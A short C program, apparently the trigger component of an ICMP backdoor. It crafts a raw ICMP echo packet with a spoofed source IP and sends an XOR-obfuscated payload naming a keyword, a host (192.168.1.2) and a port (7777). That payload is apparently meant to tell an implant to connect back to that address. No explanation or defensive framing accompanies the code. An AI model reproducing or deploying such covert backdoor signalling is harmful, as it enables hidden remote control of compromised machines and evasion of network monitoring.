#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/wait.h>
#include <errno.h>                                      
#include <sys/types.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <fcntl.h>


unsigned short csum(unsigned short *buf, int nwords) {
        unsigned long sum;
        for(sum=0; nwords>0; nwords--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return ~sum;
}

void s_xor(char *arg, int key, int nbytes) {
	int i;
	for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

void icmp(char *srcip, char *dstip, char *data) {
        int                     sockicmp;
        unsigned int            nbytes, seq = 0;
        char                    buffer[128];
        struct iphdr            *iph;
        struct icmp             *icmph;
        struct sockaddr_in      s;
        socklen_t               optval = 1;

        memset(buffer, 0, sizeof(buffer));

        iph = (struct iphdr *) buffer;
        icmph = (struct icmp *) (buffer + sizeof(struct iphdr));

        if((sockicmp = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) printf("in creating raw ICMP socket");

        if(setsockopt(sockicmp, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) == -1) printf("in setsockopt");

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->id = htons(getpid());    
        iph->ttl = 255;                
        iph->protocol = IPPROTO_ICMP; 
        iph->saddr = inet_addr(srcip);
        iph->daddr = inet_addr(dstip);

        icmph->icmp_type = 8;            
        icmph->icmp_code = ICMP_ECHO;   
        icmph->icmp_id = getpid();
        icmph->icmp_seq = seq++;

        memcpy(icmph->icmp_data, data, strlen(data));

        iph->tot_len = (sizeof(struct iphdr) + sizeof(struct icmp) + strlen(data) + 1);

        icmph->icmp_cksum = csum((unsigned short *) icmph, sizeof(struct icmp) + strlen(data) + 1);
        iph->check = csum((unsigned short *) iph, sizeof(struct iphdr));

        s.sin_family = AF_INET;
        s.sin_addr.s_addr = inet_addr(dstip);

        if((nbytes = sendto(sockicmp, buffer, iph->tot_len, 0, (struct sockaddr *) &s, sizeof(struct sockaddr))) == 0) printf("on sending package");

        close(sockicmp);
}

int main(int argc, char **argv)
{
    char* buff = (char*)malloc(strlen("tonelico 192.168.1.2 7777")+1);
    strcpy(buff, "tonelico 192.168.1.2 7777");
    s_xor(buff, 11, strlen(buff));
    icmp("192.168.2.1", "127.0.0.1", buff);
    return 0;
}
